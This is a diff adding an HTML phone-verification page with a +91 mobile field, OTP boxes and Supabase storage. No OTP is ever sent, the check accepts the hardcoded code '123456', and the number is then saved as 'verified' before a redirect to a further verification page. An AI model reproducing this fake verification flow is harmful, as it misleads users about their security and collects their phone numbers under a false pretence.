@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Get OTP</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,sans-serif;
+}
+
+html,body{
+    width:100%;
+    height:100%;
+    overflow-x:hidden;
+    background:#fff;
+}
+
+.container{
+    width:100%;
+    min-height:100vh;
+}
+
+.hero{
+    width:100%;
+    height:82vh;
+    overflow:hidden;
+    border-bottom-left-radius:40px;
+    border-bottom-right-radius:40px;
+    padding-bottom: 30px;
+}
+
+.hero img{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    display:block;
+}
+
+.bottom-section{
+    width:100%;
+    background:#fff;
+    padding:15px 20px 20px;
+}
+
+.mobile-box{
+    width:100%;
+    height:50px;
+    border:1px solid #ddd;
+    border-radius:12px;
+    overflow:hidden;
+    display:flex;
+    align-items:center;
+    background:#fff;
+    margin-bottom:12px;
+}
+
+.country-code{
+    height:100%;
+    padding:0 15px;
+    display:flex;
+    align-items:center;
+    background:#f8f8f8;
+    border-right:1px solid #ddd;
+    font-size:16px;
+    font-weight:600;
+}
+
+.mobile-box input{
+    flex:1;
+    height:100%;
+    border:none;
+    outline:none;
+    padding:0 15px;
+    font-size:16px;
+}
+
+.otp-btn{
+    width:100%;
+    height:50px;
+    border:none;
+    border-radius:12px;
+    background:#0C831F;
+    color:#fff;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+}
+
+.otp-btn:hover{
+    background:#096b18;
+}
+
+@media(min-width:768px){
+
+    body{
+        display:flex;
+        justify-content:center;
+        background:#f5f5f5;
+    }
+
+    .container{
+        width:430px;
+        background:#fff;
+        min-height:100vh;
+    }
+}
+
+.mobile-box.shake{
+    animation:shake 0.4s;
+    border-color:red;
+}
+
+@keyframes shake{
+    0%{transform:translateX(0);}
+    20%{transform:translateX(-8px);}
+    40%{transform:translateX(8px);}
+    60%{transform:translateX(-8px);}
+    80%{transform:translateX(8px);}
+    100%{transform:translateX(0);}
+}
+
+.otp-container{
+    display:flex;
+    justify-content:space-between;
+    gap:8px;
+    margin-bottom:15px;
+}
+
+.otp-box{
+    width:50px;
+    height:55px;
+    border:1px solid #ddd;
+    border-radius:12px;
+    text-align:center;
+    font-size:22px;
+    font-weight:600;
+    outline:none;
+    background:#fff;
+}
+
+.otp-box:focus{
+    border-color:#0C831F;
+}
+
+.otp-container.shake{
+    animation:shake .4s;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="hero">
+        <img src="image1.jpeg" alt="Banner">
+    </div>
+
+    <div class="bottom-section">
+
+        <div id="mobileScreen">
+
+            <div class="mobile-box">
+                <span class="country-code">+91</span>
+                <input
+                    type="tel"
+                    id="mobile"
+                    maxlength="10"
+                    placeholder="Enter mobile number"
+                    autocomplete="off">
+            </div>
+
+            <button class="otp-btn" onclick="sendOTP()">
+                Get OTP
+            </button>
+
+        </div>
+
+        <div id="otpScreen" style="display:none; width:100%;">
+
+            <div class="otp-container">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-box" id="otp1" name="otp_one_cezoo" autocomplete="new-password">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-box" id="otp2" name="otp_two_cezoo" autocomplete="new-password">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-box" id="otp3" name="otp_three_cezoo" autocomplete="new-password">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-box" id="otp4" name="otp_four_cezoo" autocomplete="new-password">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-box" id="otp5" name="otp_five_cezoo" autocomplete="new-password">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-box" id="otp6" name="otp_six_cezoo" autocomplete="new-password">
+            </div>
+
+            <button class="otp-btn" onclick="verifyOTP()">
+                Verify OTP
+            </button>
+
+        </div>
+
+    </div>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+const SUPABASE_URL = "https://fraonjwuarhkwakuitbv.supabase.co";
+const SUPABASE_ANON_KEY = "sb_publishable_30MjlIPaYGp3HS0wk7kGbQ_JO7hYUjS";
+
+const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+const otpInputs = document.querySelectorAll(".otp-box");
+
+function clearOTP(){
+    otpInputs.forEach(input => {
+        input.value = "";
+        input.setAttribute("value", "");
+    });
+}
+
+function sendOTP(){
+
+    let mobile = document.getElementById("mobile").value.trim();
+    let mobileBox = document.querySelector(".mobile-box");
+
+    mobileBox.classList.remove("shake");
+
+    if(!/^[0-9]{10}$/.test(mobile)){
+
+        void mobileBox.offsetWidth;
+        mobileBox.classList.add("shake");
+        return;
+    }
+
+    clearOTP();
+
+    document.getElementById("mobileScreen").style.display = "none";
+    document.getElementById("otpScreen").style.display = "block";
+
+    setTimeout(() => {
+        clearOTP();
+        document.getElementById("otp1").focus();
+    }, 100);
+}
+
+async function verifyOTP(){
+
+    let otp =
+        document.getElementById("otp1").value +
+        document.getElementById("otp2").value +
+        document.getElementById("otp3").value +
+        document.getElementById("otp4").value +
+        document.getElementById("otp5").value +
+        document.getElementById("otp6").value;
+
+    let otpContainer = document.querySelector(".otp-container");
+    let mobile = document.getElementById("mobile").value.trim();
+
+    otpContainer.classList.remove("shake");
+
+    if(otp !== "123456"){
+
+        void otpContainer.offsetWidth;
+        otpContainer.classList.add("shake");
+        clearOTP();
+        document.getElementById("otp1").focus();
+        return;
+    }
+
+    const { error } = await sb
+        .from("otp_verifications")
+        .insert([
+            {
+                mobile: mobile,
+                otp_code: "123456",
+                is_verified: true,
+                verified_at: new Date().toISOString()
+            }
+        ]);
+
+    if(error){
+        alert("Supabase OTP save error: " + error.message);
+        return;
+    }
+
+    localStorage.setItem("partner_mobile", mobile);
+
+    clearOTP();
+
+    window.location.href = "verification.html?mobile=" + encodeURIComponent(mobile);
+}
+
+otpInputs.forEach((input,index)=>{
+
+    input.addEventListener("input",()=>{
+
+        input.value = input.value.replace(/[^0-9]/g,"");
+
+        if(input.value.length === 1 && index < otpInputs.length-1){
+            otpInputs[index+1].focus();
+        }
+
+    });
+
+    input.addEventListener("keydown",(e)=>{
+
+        if(e.key === "Backspace" &&
+           input.value === "" &&
+           index > 0){
+
+            otpInputs[index-1].focus();
+        }
+
+    });
+
+});
+
+window.addEventListener("load", () => {
+    clearOTP();
+});
+
+window.addEventListener("pageshow", () => {
+    clearOTP();
+});
+
+window.addEventListener("beforeunload", () => {
+    clearOTP();
+});
+</script>
+
+</body>
+</html>
